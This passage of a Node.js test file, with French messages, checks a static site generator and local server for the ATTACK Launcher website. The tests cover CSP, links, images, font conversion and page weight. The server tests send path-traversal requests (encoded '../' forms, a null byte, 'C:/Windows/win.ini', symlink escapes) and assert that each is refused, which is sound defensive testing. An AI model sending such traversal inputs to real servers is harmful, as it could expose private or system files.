  assert.ok(en.includes('LGPL 3.0 or later') && en.includes('Never downloaded or redistributed') && en.includes('>Author<'));
  // une page ne contient pas deux fois un lien vers le même mod, et tout reste échappé
  assert.ok(!/<script/i.test(html));
});

test('actualités : les 3 entrées les plus récentes du CHANGELOG, dans la langue de la page', async () => {
  const fr = await miniPage('{{html.news}}', {});
  const en = await miniPage('{{html.news}}', {}, 'en/index.html');
  assert.equal(fr.match(/<article class="news-item">/g).length, 3);
  assert.equal(en.match(/<article class="news-item">/g).length, 3);
  assert.ok(fr.includes('Launcher 0.8.0') && fr.includes('Le profil 1.7.10') && fr.includes('31 octobre 2026'));
  assert.ok(fr.includes('Launcher 0.7.0') && fr.includes('Assistant OptiFine, interface soignée') && fr.includes('30 octobre 2026'));
  assert.ok(fr.includes('ATTACK Client 3.6.0'), 'la plus récente version du client livrée avec le launcher précédent');
  assert.ok(en.includes('The 1.7.10 profile') && en.includes('October 31, 2026') && en.includes('OptiFine assistant, refined interface'));
  assert.ok(fr.includes('datetime="2026-10-31"') && fr.includes('class="news-tag news-tag-new"'));
});

test('logos : SVG décoratif, identifiants de dégradés uniques par occurrence', async () => {
  const html = await miniPage('{{html.logo}}{{html.logoHero}}{{html.logo}}', {});
  const svgs = html.match(/<svg\b[^>]*>/g);
  assert.equal(svgs.length, 3);
  for (const tag of svgs) assert.ok(tag.includes('aria-hidden="true"') && tag.includes('focusable="false"') && !tag.includes('role="img"'));
  const ids = [...html.matchAll(/ id="([^"]+)"/g)].map((m) => m[1]);
  assert.equal(new Set(ids).size, ids.length, 'aucun identifiant en double');
  assert.ok(html.includes('<filter'), 'la variante « hero » a son reflet');
});

// --- sortie : fichiers publiés -----------------------------------------------------------------------------------

test('sortie : fichiers attendus, aucun .js, aucun marqueur restant, icône 180 px, robots et plan du site', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const set = new Set(result.files);
  for (const file of ['index.html', 'en/index.html', '404.html', 'styles.css', 'fonts/montserrat-bold.woff', 'fonts/OFL-montserrat.txt', 'favicon.svg',
    'apple-touch-icon.png', 'og.png', 'og-en.png', 'robots.txt', 'sitemap.xml']) assert.ok(set.has(file), file);
  assert.ok(!result.files.some((f) => /\.(js|mjs|cjs|map)$/i.test(f)), 'aucun JavaScript publié');
  assert.ok(!result.files.some((f) => /^(template|404\.template|i18n)/.test(f)), 'ni modèle ni textes sources');
  for (const page of ['index.html', 'en/index.html', '404.html']) assert.ok(!/\{\{|\}\}/.test(result.read(page)), `${page} : aucun marqueur restant`);
  const icon = fs.readFileSync(path.join(result.out, 'apple-touch-icon.png'));
  assert.equal(icon.readUInt32BE(0), 0x89504e47);
  assert.deepEqual([icon.readUInt32BE(16), icon.readUInt32BE(20)], [180, 180]);
  assert.ok(result.read('favicon.svg').startsWith('<svg xmlns="http://www.w3.org/2000/svg"'));
  const robots = result.read('robots.txt');
  assert.ok(robots.includes('Allow: /') && robots.includes('Sitemap: https://7shiki3.github.io/attack-launcher/sitemap.xml'));
  const sitemap = result.read('sitemap.xml');
  assert.equal(sitemap.match(/<loc>/g).length, 2);
  for (const url of ['https://7shiki3.github.io/attack-launcher/', 'https://7shiki3.github.io/attack-launcher/en/']) assert.ok(sitemap.includes(`<loc>${url}</loc>`));
  for (const lang of ['fr', 'en', 'x-default']) assert.ok(sitemap.includes(`hreflang="${lang}"`));
});

test('sortie : balise lang, canonique et alternates hreflang de chaque page', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const fr = result.read('index.html');
  const en = result.read('en/index.html');
  assert.match(fr, /<html[^>]*\slang="fr"/);
  assert.match(en, /<html[^>]*\slang="en"/);
  const links = (html) => tagsOf(html, 'link').map(attrs);
  assert.equal(links(fr).find((l) => l.rel === 'canonical').href, 'https://7shiki3.github.io/attack-launcher/');
  assert.equal(links(en).find((l) => l.rel === 'canonical').href, 'https://7shiki3.github.io/attack-launcher/en/');
  for (const page of [fr, en]) {
    const alternates = Object.fromEntries(links(page).filter((l) => l.rel === 'alternate' && l.hreflang).map((l) => [l.hreflang, l.href]));
    assert.equal(alternates.fr, 'https://7shiki3.github.io/attack-launcher/');
    assert.equal(alternates.en, 'https://7shiki3.github.io/attack-launcher/en/');
    const metas = tagsOf(page, 'meta').map(attrs);
    assert.ok(metas.some((m) => m.name === 'viewport'), 'meta viewport');
    assert.ok(metas.some((m) => m.name === 'description' && m.content.length > 20), 'meta description');
    assert.match(page, /<title>[^<]+<\/title>/);
  }
});

test('sécurité : CSP exacte en meta sur chaque page, referrer, color-scheme, theme-color', { skip: NEED_SRC }, async () => {
  const result = await generated();
  assert.equal(site.CSP, EXPECTED_CSP);
  for (const page of ['index.html', 'en/index.html', '404.html']) {
    const html = result.read(page);
    const metas = tagsOf(html, 'meta').map(attrs);
    const csp = metas.filter((m) => (m['http-equiv'] || '').toLowerCase() === 'content-security-policy');
    assert.equal(csp.length, 1, `${page} : une seule meta CSP`);
    assert.equal(csp[0].content, EXPECTED_CSP, page);
    assert.equal(metas.find((m) => m.name === 'referrer').content, 'no-referrer', page);
    assert.equal(metas.find((m) => m.name === 'color-scheme').content, 'dark', page);
    assert.equal(metas.find((m) => m.name === 'theme-color').content.toLowerCase(), '#09090c', page);
  }
});

test('sécurité : ni script, ni attribut style, ni gestionnaire d’événement, ni ressource tierce', { skip: NEED_SRC }, async () => {
  const result = await generated();
  for (const page of ['index.html', 'en/index.html', '404.html']) {
    const html = result.read(page);
    assert.ok(!/<script\b/i.test(html), `${page} : pas de <script>`);
    assert.ok(!/<style\b/i.test(html), `${page} : pas de <style> (style-src 'self')`);
    for (const tag of tagsOf(html, '[a-z][^\\s/>]*')) {
      const names = Object.keys(attrs(tag));
      assert.ok(!names.includes('style'), `${page} : attribut style= dans ${tag.slice(0, 80)}`);
      assert.ok(!names.some((n) => /^on[a-z]+$/.test(n)), `${page} : gestionnaire en ligne dans ${tag.slice(0, 80)}`);
    }
    assert.ok(!/javascript:/i.test(html), `${page} : pas d'adresse javascript:`);
    assert.deepEqual(thirdPartyResources(html), [], `${page} : ressource tierce (src, srcset ou href de <link>)`);
    assert.ok(!/<(iframe|object|embed|form|base)\b/i.test(html), `${page} : pas d'iframe, objet, formulaire ni base`);
  }
  const css = result.read('styles.css');
  assert.ok(!/@import|url\(\s*["']?(https?:)?\/\//i.test(css), 'CSS : aucune ressource distante');
});

test('partage : og:image de chaque langue (adresse absolue du site), largeur, hauteur et texte alternatif', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const size = (file) => {
    const png = fs.readFileSync(path.join(result.out, file));
    return [String(png.readUInt32BE(16)), String(png.readUInt32BE(20))];
  };
  for (const [page, image, alt] of [['index.html', 'og.png', /^Fenêtre d’ATTACK Launcher/], ['en/index.html', 'og-en.png', /^ATTACK Launcher window/]]) {
    const metas = tagsOf(result.read(page), 'meta').map(attrs);
    const content = (property) => (metas.find((m) => m.property === property) || {}).content;
    assert.equal(content('og:image'), `https://7shiki3.github.io/attack-launcher/${image}`, `${page} : image de la langue de la page, à la racine du site`);
    assert.deepEqual([content('og:image:width'), content('og:image:height')], size(image), `${page} : dimensions de ${image}`);
    assert.match(decode(content('og:image:alt') || ''), alt, `${page} : texte alternatif dans la langue de la page`);
  }
});

test('liens : tout src, href, srcset et url() relatif désigne un fichier (ou une ancre) qui existe', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const BASE = '/attack-launcher/';
  const check = (page, raw) => {
    const value = urlOf(raw);
    if (!value || /^(https?:|mailto:|tel:|data:)/i.test(value)) return;
    if (value.startsWith('#')) {
      assert.ok(new RegExp(`\\sid="${value.slice(1).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}"`).test(result.read(page)), `${page} : ancre ${value} sans cible`);
      return;
    }
    const clean = value.split('#')[0].split('?')[0];
    let target;
    if (clean.startsWith('/')) {
      assert.ok(clean.startsWith(BASE), `${page} : lien absolu hors du site : ${value}`);
      target = path.join(result.out, clean.slice(BASE.length));
    } else target = path.join(result.out, path.dirname(page), clean);
    assert.ok(target.startsWith(result.out), `${page} : ${value} sort du site`);
    if (fs.existsSync(target) && fs.statSync(target).isDirectory()) target = path.join(target, 'index.html'); // GitHub Pages sert index.html
    assert.ok(fs.existsSync(target) && fs.statSync(target).isFile(), `${page} : ${value} introuvable dans _site`);
  };
  for (const page of ['index.html', 'en/index.html', '404.html']) {
    const html = result.read(page);
    for (const m of html.matchAll(/\s(?:src|href|poster|data-src)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'<>`]+))/g)) check(page, m[1] ?? m[2] ?? m[3]);
    for (const m of html.matchAll(/\ssrcset\s*=\s*(?:"([^"]*)"|'([^']*)')/g)) for (const part of (m[1] ?? m[2]).split(',')) check(page, part.trim().split(/\s+/)[0]);
  }
  const css = result.read('styles.css');
  for (const m of css.matchAll(/url\(\s*["']?([^"')]+)["']?\s*\)/g)) check('styles.css', m[1]);
});

test('liens externes : hôtes de la liste blanche, rel="noopener noreferrer", jamais de lien vers le piège', { skip: NEED_SRC }, async () => {
  const result = await generated();
  for (const page of ['index.html', 'en/index.html', '404.html']) {
    assert.deepEqual(externalLinkProblems(result.read(page), page), []);
  }
});

test('images de la page : alt, width, height et loading="lazy" sauf une au plus', { skip: NEED_SRC }, async () => {
  const result = await generated();
  for (const page of ['index.html', 'en/index.html']) {
    const imgs = tagsOf(result.read(page), 'img').map(attrs);
    assert.ok(imgs.length > 0, `${page} : au moins une image`);
    for (const a of imgs) {
      assert.ok(a.alt && a.alt.length > 2, `${page} : alt manquant sur ${a.src}`);
      assert.ok(/^[1-9]\d*$/.test(a.width) && /^[1-9]\d*$/.test(a.height), `${page} : width/height sur ${a.src}`);
      assert.ok(a.srcset && a.sizes && a.decoding === 'async', `${page} : srcset, sizes et decoding sur ${a.src}`);
    }
    assert.ok(imgs.filter((a) => a.loading !== 'lazy').length <= 1, `${page} : une seule image sans lazy (la première)`);
  }
});

test('release dans la page : la fixture valide donne le Setup, la taille et le SHA-256 ; le piège donne le lien générique', { skip: NEED_SRC }, async () => {
  const good = await generated(FIXTURE);
  const i18nFile = path.join(SRC, 'i18n.js');
  delete require.cache[require.resolve(i18nFile)];
  const sources = fs.readFileSync(path.join(SRC, 'template.html'), 'utf8') + JSON.stringify(require(i18nFile));
  const usesMarker = (name) => sources.includes(name);
  for (const page of ['index.html', 'en/index.html']) {
    const html = good.read(page);
    assert.ok(html.includes('releases/download/v0.5.16/ATTACK-Launcher-Setup-0.5.16.exe'), `${page} : lien du Setup`);
    // le SHA-256 et la taille ne sont contr\u00f4l\u00e9s que si le mod\u00e8le ou les textes les utilisent
    if (usesMarker('rel.sha256')) assert.ok(html.includes('2299e608466c913ebb39654b549c87c03bcef21e57ddb7f4320b6ea1da58521d'), `${page} : SHA-256`);
    if (usesMarker('rel.setupSize')) assert.ok(/107[,.]5\u00a0(Mo|MB)/.test(html), `${page} : taille`);
    assert.ok(html.includes('releases/download/v0.5.16/ATTACK-Launcher-Portable-0.5.16.exe'), `${page} : lien du Portable`);
  }
  const trap = await generated(TRAP);
  assert.equal(trap.rel, null);
  assert.ok(trap.problems.length > 0);
  for (const page of ['index.html', 'en/index.html', '404.html']) {
    const html = trap.read(page);
    assert.ok(!html.includes('evil-user') && !html.includes('releases/download') && !html.includes('<script') && !html.includes('phish'), `${page} : rien du piège`);
  }
  for (const page of ['index.html', 'en/index.html']) {
    assert.ok(trap.read(page).includes('https://github.com/7ShIkI3/attack-launcher/releases/latest'), `${page} : lien générique vers les releases`);
  }
});

test('crédits dans la page : tous les mods des 3 packs et les lignes fixes', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const union = new Set();
  for (const file of fs.readdirSync(path.join(ROOT, 'src', 'main', 'packs'))) for (const mod of readJson(path.join(ROOT, 'src', 'main', 'packs', file)).mods) union.add(mod.slug);
  for (const page of ['index.html', 'en/index.html']) {
    const html = result.read(page);
    assert.ok(html.includes('class="credits-table"'), `${page} : tableau des crédits`);
    const slugs = [...html.matchAll(/href="https:\/\/modrinth\.com\/mod\/([^"]+)"/g)].map((m) => m[1]);
    assert.deepEqual([...new Set(slugs)].sort(), [...union].sort(), `${page} : mêmes mods que les packs`);
    for (const fixed of ['OptiFine', 'skinview3d', 'three.js', 'Electron', 'electron-updater', '>Inter</a>', 'Montserrat']) assert.ok(html.includes(fixed), `${page} : ${fixed}`);
  }
});

test('textes : mêmes clés en français et en anglais dans i18n.js, aucune valeur vide', { skip: NEED_SRC }, () => {
  const file = path.join(SRC, 'i18n.js');
  delete require.cache[require.resolve(file)];
  const texts = require(file);
  const fr = site.flattenKeys(texts.fr);
  const en = site.flattenKeys(texts.en);
  assert.deepEqual(Object.keys(fr).sort(), Object.keys(en).sort());
  for (const [key, value] of [...Object.entries(fr), ...Object.entries(en)]) assert.ok(value.trim().length > 0, `valeur vide : ${key}`);
  for (const key of KEYS) assert.ok(`alt.${key}` in fr, `texte alternatif manquant : alt.${key}`);
});

// --- images produites ---------------------------------------------------------------------------------------------

test('images : manifeste cohérent avec les WebP (dimensions, poids <= 150 Ko, clés du contrat, une langue au moins)', () => {
  const dir = path.join(REAL_SRC, 'img');
  const { images } = readJson(path.join(dir, 'manifest.json'));
  assert.ok(images.length >= KEYS.length);
  for (const key of KEYS) assert.ok(images.some((i) => i.key === key), `image absente : ${key}`);
  for (const image of images) {
    const buffer = fs.readFileSync(path.join(dir, image.file));
    const size = site.webpSize(buffer);
    assert.deepEqual(size, { width: image.width, height: image.height }, image.file);
    assert.ok(buffer.length <= 150 * 1024, `${image.file} : ${buffer.length} octets`);
    assert.equal(image.bytes, buffer.length, `${image.file} : octets du manifeste`);
    assert.match(image.sourceSha256, /^[0-9a-f]{64}$/);
    assert.ok(Math.abs(image.height / image.width - (image.cropHeight || image.sourceHeight) / image.sourceWidth) < 0.01, `${image.file} : proportions`);
  }
  // la capture « Compte » est coupée dans le fichier lui-même (le message d'erreur du compte factice est sous la ligne 618), plus par le CSS
  for (const image of images.filter((i) => i.key === 'launcher-account')) {
    assert.equal(image.cropHeight, 618, `${image.file} : coupée à 618 px de la source`);
    assert.equal(image.height, Math.round((618 * image.width) / image.sourceWidth), `${image.file} : hauteur`);
  }
  assert.ok(images.filter((i) => i.key !== 'launcher-account').every((i) => !('cropHeight' in i)), 'seule la capture « Compte » est coupée');
  for (const key of KEYS) {
    const widths = new Set(images.filter((i) => i.key === key && i.lang === 'fr').map((i) => i.width));
    assert.deepEqual([...widths].sort((a, b) => a - b), key.startsWith('client-') ? [854] : [560, 1120], `${key} (fr) : largeurs`);
  }
  const listed = new Set(images.map((i) => i.file));
  for (const file of fs.readdirSync(dir).filter((f) => f.endsWith('.webp'))) assert.ok(listed.has(file), `${file} absent du manifeste`);
  const og = {};
  for (const name of ['og.png', 'og-en.png']) {
    og[name] = fs.readFileSync(path.join(dir, name));
    assert.equal(og[name].readUInt32BE(0), 0x89504e47, `image de partage ${name}`);
    assert.deepEqual([og[name].readUInt32BE(16), og[name].readUInt32BE(20)], [1120, 700], `${name} : les dimensions déclarées dans les balises og:image:width et og:image:height`);
  }
  assert.ok(!og['og.png'].equals(og['og-en.png']), 'og-en.png est la capture anglaise, pas une copie de la française');
});

// --- police -------------------------------------------------------------------------------------------------------

/** Lecteur WOFF 1.0 indépendant du convertisseur : { header, tables: [{ tag, offset, compLength, origLength, checksum, data }] }. */
function readWoff(buffer) {
  assert.equal(buffer.toString('ascii', 0, 4), 'wOFF');
  const header = {
    flavor: buffer.readUInt32BE(4), length: buffer.readUInt32BE(8), numTables: buffer.readUInt16BE(12), reserved: buffer.readUInt16BE(14),
    totalSfntSize: buffer.readUInt32BE(16), meta: [buffer.readUInt32BE(24), buffer.readUInt32BE(28), buffer.readUInt32BE(32)], priv: [buffer.readUInt32BE(36), buffer.readUInt32BE(40)],
  };
  const tables = [];
  for (let i = 0; i < header.numTables; i++) {
    const at = 44 + i * 20;
    const entry = { tag: buffer.toString('ascii', at, at + 4), offset: buffer.readUInt32BE(at + 4), compLength: buffer.readUInt32BE(at + 8), origLength: buffer.readUInt32BE(at + 12), checksum: buffer.readUInt32BE(at + 16) };
    const raw = buffer.subarray(entry.offset, entry.offset + entry.compLength);
    entry.data = entry.compLength < entry.origLength ? zlib.inflateSync(raw) : raw;
    tables.push(entry);
  }
  return { header, tables };
}

function readTtf(buffer) {
  const count = buffer.readUInt16BE(4);
  const tables = {};
  for (let i = 0; i < count; i++) {
    const at = 12 + i * 16;
    tables[buffer.toString('ascii', at, at + 4)] = { checksum: buffer.readUInt32BE(at + 4), data: buffer.subarray(buffer.readUInt32BE(at + 8), buffer.readUInt32BE(at + 8) + buffer.readUInt32BE(at + 12)) };
  }
  return { flavor: buffer.readUInt32BE(0), tables };
}

test('police : le WOFF relu redonne chacune des tables du TTF, avec la bonne structure', () => {
  const ttfBuffer = fs.readFileSync(path.join(ROOT, 'src', 'renderer', 'fonts', 'Montserrat-Bold.ttf'));
  const ttf = readTtf(ttfBuffer);
  const woffBuffer = site.ttfToWoff(ttfBuffer);
  const woff = readWoff(woffBuffer);
  assert.equal(woff.header.flavor, ttf.flavor);
  assert.equal(woff.header.length, woffBuffer.length);
  assert.equal(woff.header.reserved, 0);
  assert.deepEqual([...woff.header.meta, ...woff.header.priv], [0, 0, 0, 0, 0]);
  assert.equal(woff.header.numTables, Object.keys(ttf.tables).length);
  assert.deepEqual(woff.tables.map((t) => t.tag), woff.tables.map((t) => t.tag).sort(), 'répertoire trié par étiquette');
  let sfnt = 12 + 16 * woff.header.numTables;
  let expectedOffset = 44 + 20 * woff.header.numTables;
  let compressed = 0;
  for (const table of woff.tables) {
    const original = ttf.tables[table.tag];
    assert.ok(original, `table ${table.tag} dans le TTF`);
    assert.equal(table.origLength, original.data.length, table.tag);
    assert.equal(table.checksum, original.checksum, `${table.tag} : somme de contrôle d'origine`);
    assert.ok(table.data.equals(original.data), `${table.tag} : contenu identique après décompression`);
    assert.ok(table.compLength <= table.origLength, `${table.tag} : jamais plus gros`);
    assert.equal(table.offset % 4, 0, `${table.tag} : aligné sur 4 octets`);
    assert.equal(table.offset, expectedOffset, `${table.tag} : tables contiguës`);
    expectedOffset += (table.compLength + 3) & ~3;
    sfnt += (table.origLength + 3) & ~3;
    if (table.compLength < table.origLength) compressed++;
  }
  assert.equal(woff.header.totalSfntSize, sfnt);
  assert.equal(woffBuffer.length, expectedOffset);
  assert.ok(compressed > 0, 'au moins une table compressée');
});

test('police : le WOFF publié existe, est identique à la conversion et tient dans le budget', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const published = fs.readFileSync(path.join(result.out, 'fonts', 'montserrat-bold.woff'));
  assert.ok(published.equals(site.ttfToWoff(fs.readFileSync(path.join(ROOT, 'src', 'renderer', 'fonts', 'Montserrat-Bold.ttf')))));
  assert.ok(published.length <= 200 * 1024, `police : ${published.length} octets`);
  assert.ok(result.read('fonts/OFL-montserrat.txt').includes('SIL Open Font License'));
});

// --- poids --------------------------------------------------------------------------------------------------------

test('poids : HTML <= 60 Ko, CSS <= 25 Ko, police <= 200 Ko, image <= 150 Ko, une page complète <= 1,3 Mo', { skip: NEED_SRC }, async () => {
  const result = await generated();
  const size = (file) => fs.statSync(path.join(result.out, file)).size;
  for (const page of ['index.html', 'en/index.html', '404.html']) assert.ok(size(page) <= 60 * 1024, `${page} : ${size(page)} octets`);
  assert.ok(size('styles.css') <= 25 * 1024, `styles.css : ${size('styles.css')} octets`);
  assert.ok(size('fonts/montserrat-bold.woff') <= 200 * 1024);
  for (const file of result.files.filter((f) => f.endsWith('.webp'))) assert.ok(size(file) <= 150 * 1024, `${file} : ${size(file)} octets`);
  for (const page of ['index.html', 'en/index.html']) {
    const html = result.read(page);
    const dir = path.dirname(page);
    const loaded = new Set(['styles.css', 'fonts/montserrat-bold.woff', 'favicon.svg']);
    for (const tag of tagsOf(html, 'img')) loaded.add(path.posix.normalize(path.posix.join(dir, attrs(tag).src)));
    const total = size(page) + [...loaded].reduce((sum, file) => sum + size(file), 0);
    assert.ok(total <= 1.3 * 1024 * 1024, `${page} : ${total} octets au total`);
  }
});

// --- serveur local ------------------------------------------------------------------------------------------------

function get(port, requestPath, { method = 'GET' } = {}) {
  return new Promise((resolve, reject) => {
    const request = http.request({ host: '127.0.0.1', port, path: requestPath, method }, (response) => {
      const chunks = [];
      response.on('data', (c) => chunks.push(c));
      response.on('end', () => resolve({ status: response.statusCode, headers: response.headers, body: Buffer.concat(chunks) }));
    });
    request.on('error', reject);
    request.end();
  });
}

test('serveur local : 200 sur les pages et fichiers, 404.html en 404, redirections, jamais de remontée de dossier', { skip: NEED_SRC }, async (t) => {
  const result = await generated();
  const server = serve.createServer(result.out);
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => {
    server.closeAllConnections();
    server.close();
  });
  const { port, address } = server.address();
  assert.equal(address, '127.0.0.1');

  const home = await get(port, '/attack-launcher/');
  assert.equal(home.status, 200);
  assert.equal(home.headers['content-type'], 'text/html; charset=utf-8');
  assert.equal(home.headers['content-security-policy'], EXPECTED_CSP, 'même CSP que la meta');
  assert.ok(home.body.equals(fs.readFileSync(path.join(result.out, 'index.html'))));
  assert.equal((await get(port, '/attack-launcher/en/')).status, 200);
  assert.equal((await get(port, '/attack-launcher/index.html')).status, 200);
  const css = await get(port, '/attack-launcher/styles.css');
  assert.deepEqual([css.status, css.headers['content-type']], [200, 'text/css; charset=utf-8']);
  const font = await get(port, '/attack-launcher/fonts/montserrat-bold.woff');
  assert.deepEqual([font.status, font.headers['content-type']], [200, 'font/woff']);
  const image = result.images[0];
  const webp = await get(port, `/attack-launcher/img/${image}`);
  assert.deepEqual([webp.status, webp.headers['content-type']], [200, 'image/webp']);
  assert.equal((await get(port, '/attack-launcher/favicon.svg')).headers['content-type'], 'image/svg+xml');
  assert.equal((await get(port, '/attack-launcher/sitemap.xml')).headers['content-type'], 'application/xml; charset=utf-8');
  assert.equal((await get(port, '/attack-launcher/robots.txt')).headers['content-type'], 'text/plain; charset=utf-8');
  assert.equal((await get(port, '/attack-launcher/og.png')).headers['content-type'], 'image/png');
  assert.equal((await get(port, '/attack-launcher/og-en.png')).headers['content-type'], 'image/png');

  const missing = await get(port, '/attack-launcher/x/y');
  assert.equal(missing.status, 404);
  assert.ok(missing.body.equals(fs.readFileSync(path.join(result.out, '404.html'))), '404 = 404.html');
  assert.equal(missing.headers['content-security-policy'], EXPECTED_CSP);
  assert.equal((await get(port, '/autre/chemin')).status, 404);
  assert.equal((await get(port, '/attack-launcher/img/')).status, 404, 'pas de listing de dossier');

  const root = await get(port, '/');
  assert.deepEqual([root.status, root.headers.location], [302, '/attack-launcher/']);
  const bare = await get(port, '/attack-launcher');
  assert.deepEqual([bare.status, bare.headers.location], [301, '/attack-launcher/']);
  const en = await get(port, '/attack-launcher/en');
  assert.deepEqual([en.status, en.headers.location], [301, '/attack-launcher/en/']);

  for (const evil of ['/attack-launcher/../package.json', '/attack-launcher/..%2fpackage.json', '/attack-launcher/%2e%2e/%2e%2e/package.json',
    '/attack-launcher/..%5cpackage.json', '/attack-launcher/img/../../package.json', '/attack-launcher/%00', '/../package.json', '/attack-launcher/C:/Windows/win.ini']) {
    const r = await get(port, evil);
    assert.ok([400, 403, 404].includes(r.status), `${evil} -> ${r.status}`);
    assert.ok(!r.body.toString('utf8').includes('"name": "attack-launcher"'), `${evil} : package.json ne doit pas sortir`);
  }
  assert.equal((await get(port, '/attack-launcher/../package.json')).status, 403);
  assert.equal((await get(port, '/attack-launcher/%zz')).status, 400);
  assert.equal((await get(port, '/attack-launcher/', { method: 'POST' })).status, 405);
  const head = await get(port, '/attack-launcher/', { method: 'HEAD' });
  assert.deepEqual([head.status, head.body.length], [200, 0]);
});

test('serveur local : une jonction ou un lien qui sort du dossier servi donne 403 (rien n’est lu), un fichier absent 404', async (t) => {
  const base = tempDir('attack-serve-');
  const served = path.join(base, 'servi');
  const outside = path.join(base, 'dehors');
  const sibling = path.join(base, 'servi-evil'); // même début de nom que le dossier servi : la garde doit comparer avec le séparateur
  for (const dir of [served, outside, sibling, path.join(served, 'sous')]) fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(sibling, 'voisin.txt'), 'SECRET');
  fs.writeFileSync(path.join(served, 'index.html'), '<!doctype html><title>ok</title>');
  fs.writeFileSync(path.join(served, '404.html'), '<!doctype html><title>404</title>');
  fs.writeFileSync(path.join(served, 'ok.txt'), 'ok');
  fs.writeFileSync(path.join(served, 'sous', 'page.txt'), 'page');
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'SECRET');
  try {
    fs.symlinkSync(outside, path.join(served, 'lien'), 'junction'); // jonction sous Windows (sans droits particuliers), lien symbolique ailleurs
    fs.symlinkSync(path.join(served, 'sous'), path.join(served, 'alias'), 'junction');
    fs.symlinkSync(sibling, path.join(served, 'voisin'), 'junction');
  } catch (error) {
    t.skip(`liens impossibles ici : ${error.code}`);
    return;
  }
  let fileLink = true;
  try {
    fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(served, 'secret.txt'), 'file');
  } catch {
    fileLink = false; // Windows sans le droit de créer des liens de fichiers : la jonction suffit à prouver la garde
  }
  const server = serve.createServer(served);
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => {
    server.closeAllConnections();
    server.close();
  });
  const { port } = server.address();
  const status = async (url) => (await get(port, `/attack-launcher/${url}`)).status;
  assert.equal(await status('ok.txt'), 200);
  assert.equal(await status(''), 200);
  assert.equal(await status('alias/page.txt'), 200, 'une jonction qui reste dans le dossier servi est lue');
  for (const url of ['lien/secret.txt', 'lien/', 'lien', 'voisin/voisin.txt', 'voisin/']) {
    const answer = await get(port, `/attack-launcher/${url}`);
    assert.equal(answer.status, 403, url);
    assert.ok(!answer.body.toString('utf8').includes('SECRET'), `${url} : le fichier du dehors ne doit pas sortir`);
  }
  if (fileLink) assert.equal(await status('secret.txt'), 403, 'un lien de fichier vers l’extérieur est refusé');
  assert.equal(await status('lien/absent.txt'), 404, 'sous le lien, un fichier absent reste un 404');
  assert.equal(await status('absent.txt'), 404);
});

test('serveur local : --dir sans valeur (comme --port) donne un message clair et le code 1, sans trace', () => {
  const script = path.join(ROOT, 'scripts', 'serve-site.js');
  const run = (...args) => spawnSync(process.execPath, [script, ...args], { encoding: 'utf8', timeout: 30000 });
  const missing = path.join(tempDir('attack-serve-vide-'), 'absent');
  const cases = [
    [['--dir'], /--dir attend un dossier/],
    [['--dir', '--port', '4999'], /--dir attend un dossier/],
    [['--dir', ''], /--dir attend un dossier/],
    [['--port'], /--port attend un numéro de port valide/],
    [['--port', '70000'], /--port attend un numéro de port valide/],
    [['--dir', missing], /est vide ou absent/],
    [[`--dir=${missing}`], /est vide ou absent/],
    [['--dir='], /--dir attend un dossier/],
    [['--port=0'], /--port attend un numéro de port valide/],
    [['--foo'], /argument inconnu : --foo/],
    [['_site'], /argument inconnu : _site/],
  ];
  for (const [args, message] of cases) {
    const result = run(...args);
    assert.equal(result.status, 1, `${args.join(' ')} : code de sortie`);
    assert.match(result.stderr, message, args.join(' '));
    assert.ok(!/\n\s+at /.test(result.stderr) && !/TypeError|ERR_INVALID_ARG/.test(result.stderr), `${args.join(' ')} : pas de trace de pile`);
  }
});

// --- README, ligne de commande, liens ------------------------------------------------------------------------------

test('README : les liens relatifs et les ancres existent', () => {
  const text = fs.readFileSync(path.join(ROOT, 'README.md'), 'utf8');
  const withoutCode = text.replace(/```[\s\S]*?```/g, '');
  const slug = (heading) => heading.toLowerCase().trim().replace(/[^\p{L}\p{N}\s-]/gu, '').replace(/\s/g, '-');
  const anchors = new Set([...withoutCode.matchAll(/^#{1,6}\s+(.+)$/gm)].map((m) => slug(m[1].replace(/[*`_]/g, ''))));
  const links = [...withoutCode.matchAll(/!?\[[^\]]*\]\(([^)\s]+)(?:\s+"[^"]*")?\)/g)].map((m) => m[1]);
  const images = [...withoutCode.matchAll(/<img[^>]+src="([^"]+)"/g)].map((m) => m[1]);
  assert.ok(links.length > 5);
  for (const link of [...links, ...images]) {
    if (/^(https?:|mailto:)/i.test(link)) continue;
    if (link.startsWith('#')) {
      assert.ok(anchors.has(decodeURIComponent(link.slice(1))), `ancre introuvable : ${link}`);
      continue;
    }
    const target = path.join(ROOT, decodeURIComponent(link.split('#')[0]));
    assert.ok(fs.existsSync(target), `README : ${link} n’existe pas`);
  }
});

test('ligne de commande : options reconnues, option inconnue refusée', () => {
  assert.deepEqual(site.parseArgs(['--offline', '--strict', '--check-links', '--out', 'x', '--src', 'y', '--fixture', 'z.json']),
    { offline: true, strict: true, checkLinks: true, out: 'x', src: 'y', fixture: 'z.json' });
  assert.throws(() => site.parseArgs(['--nope']), /Option inconnue/);
  assert.throws(() => site.parseArgs(['--out']), /attend une valeur/);
  assert.throws(() => site.parseArgs(['--out', '--strict']), /attend une valeur/);
});

test('--check-links : les adresses sont extraites des pages et du README, sans réseau ici', () => {
  const urls = site.collectLinks('<svg xmlns="http://www.w3.org/2000/svg"><a href="https://modrinth.com/mod/sodium" rel="x">a</a> (https://github.com/7ShIkI3/attack-launcher/releases.) et `https://x.test/a?b=1`');
  assert.deepEqual([...urls].sort(), ['https://github.com/7ShIkI3/attack-launcher/releases', 'https://modrinth.com/mod/sodium', 'https://x.test/a?b=1'], 'l’espace de noms SVG n’est pas un lien');
});

/** Lit un fichier texte en LF : sous Windows, git (core.autocrlf=true) l'écrit en CRLF au checkout. */
function readLf(file) {
  return fs.readFileSync(file, 'utf8').replace(/\r\n/g, '\n');
}

const PAGES_YML = path.join(ROOT, '.github', 'workflows', 'pages.yml');
/** Chemins qui relancent le workflow (push et pull request) : le site, ce qui le nourrit (packs, textes du launcher, icônes, version, README) et ses tests. */
